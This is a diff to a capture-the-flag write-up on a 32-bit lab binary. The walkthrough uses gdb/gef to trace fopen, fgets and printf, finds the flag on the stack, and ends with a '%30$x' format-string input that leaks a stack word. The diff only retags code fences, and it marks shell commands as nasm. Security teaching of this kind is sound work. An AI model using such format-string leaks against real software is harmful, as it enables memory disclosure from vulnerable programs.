@@ -12,7 +12,7 @@ This is an exciting binary. It has no canary and no PIE, but it has a secure cal
 
 We first notice that it does nothing when we try to run the program. We'll notice later that this is because the binary ensures that a file called flag.txt is sitting in the same directory; otherwise, it will stop execution. We can create a dummy file to get around this. I use the same flag every time:
 
-```bash
+```nasm
 echo flag{temporary_flag} > flag.txt
 ```
 
@@ -24,7 +24,7 @@ With that out of the way, we can now run the binary. It asks for some input and 
 
 We can use `checksec` to see what protections are enabled on the binary:
 
-```bash
+```nasm
 $ checksec chase
 [*] '/home/joybuzzer/Documents/vunrotc/public/03-formats/chase/src/chase'
     Arch:     i386-32-little
@@ -55,7 +55,7 @@ Using `gdb`, we can check the arguments:
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 (gdb) disas *(main+49)
 (gdb) r
 ```
@@ -68,7 +68,7 @@ Using `gdb`, we can check the arguments:
 
 `gef` will predict the arguments for us:
 
-```as
+```nasm
 fopen@plt (
    [sp + 0x0] = 0x0804a00a → "flag.txt",
    [sp + 0x4] = 0x0804a008 → 0x6c660072 ("r"?),
@@ -81,7 +81,7 @@ If we didn't have `gef`, we could check the stack:
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  x/2wx $esp
 0xffffd4f0:	0x0804a00a	0x0804a008
 gef➤  x/s 0x0804a00a
@@ -100,7 +100,7 @@ gef➤  x/s 0x0804a008
 
 The next call is to `fgets()`. We can check the arguments in the same way:
 
-```as
+```nasm
 fgets@plt (
    [sp + 0x0] = 0xffffd568 → 0xf7ffda40 → 0x00000000,
    [sp + 0x4] = 0x00000064,
@@ -116,7 +116,7 @@ This isn't super helpful to us. We know that `fgets()` takes three arguments:
 
 The first and third ones make little sense until we check the assembly.
 
-```as
+```nasm
    0x08049215 <+79>:	push   DWORD PTR [ebp-0xc]
    0x08049218 <+82>:	push   0x64
    0x0804921a <+84>:	lea    eax,[ebp-0x70]
@@ -134,7 +134,7 @@ This tells us that we're reading 100 bytes from the file into the buffer at `ebp
 
 None of the `puts()` calls are really important to us, so we're going to skip those. Then we reach `fgets()`.
 
-```as
+```nasm
    0x08049266 <+160>:	mov    eax,DWORD PTR [ebx-0x4]
    0x0804926c <+166>:	mov    eax,DWORD PTR [eax]
    0x0804926e <+168>:	sub    esp,0x4
@@ -149,7 +149,7 @@ The first argument is the address of `ebp-0xd4`, which is where we are writing. 
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  x/3wx $esp
 0xffffd4f0:	0xffffd504	0x00000064	0xf7e2a620
 gef➤  x/wx 0xf7e2a620
@@ -166,7 +166,7 @@ We see that the third argument is `stdin`, which makes sense because we've been 
 
 Last, we see that there is a call to `printf()`. We can check the arguments in the same way:
 
-```as
+```nasm
 0x08049286 <+192>:	lea    eax,[ebp-0xd4]
 0x0804928c <+198>:	push   eax
 0x0804928d <+199>:	call   0x8049050 <printf@plt>
@@ -202,7 +202,7 @@ We can use `gdb` to find the flag. If we put the instruction pointer right befor
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  x/40wx $esp
 0xffffd4f0:	0xffffd504	0x00000064	0xf7e2a620	0x080491e0
 0xffffd500:	0xf7c184be	0xf7fd0294	0xf7c05674	0xffffd57c
@@ -226,7 +226,7 @@ Here's why we use `flag{temporary_flag}` as the contents of _flag.txt_. `flag` i
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  x/s 0xffffd568
 0xffffd568:	"flag{temporary_flag}\n"
 ```
@@ -239,7 +239,7 @@ gef➤  x/s 0xffffd568
 
 We count that this starts at the 30th word on the stack. We can verify this using the format specifier in our input:
 
-```bash
+```nasm
 $ ./chase
 Hi, what is your name?
 %30$x
